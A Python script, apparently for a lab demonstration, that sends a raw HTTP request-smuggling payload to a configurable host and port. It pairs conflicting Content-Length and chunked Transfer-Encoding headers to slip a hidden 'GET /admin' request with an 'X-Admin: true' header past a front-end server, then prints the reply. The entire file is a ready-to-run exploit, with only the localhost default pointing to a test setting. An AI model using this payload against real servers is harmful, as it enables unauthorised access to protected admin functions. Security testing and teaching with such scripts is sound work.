#!/usr/bin/env python3
"""Send the request-smuggling demonstration payload."""

import argparse
import socket


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="127.0.0.1", help="lab host (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=8000, help="lab port (default: 8000)")
    parser.add_argument("--timeout", type=float, default=3.0, help="socket timeout in seconds")
    args = parser.parse_args()

    payload = (
        "POST /submit HTTP/1.1\r\n"
        "Host: test\r\n"
        "Content-Length: 13\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /admin HTTP/1.1\r\n"
        "Host: test\r\n"
        "X-Admin: true\r\n"
        "\r\n"
    ).encode()

    with socket.create_connection((args.host, args.port), timeout=args.timeout) as sock:
        sock.sendall(payload)
        sock.shutdown(socket.SHUT_WR)
        response = bytearray()
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            response.extend(chunk)

    print(response.decode(errors="replace"))


if __name__ == "__main__":
    main()
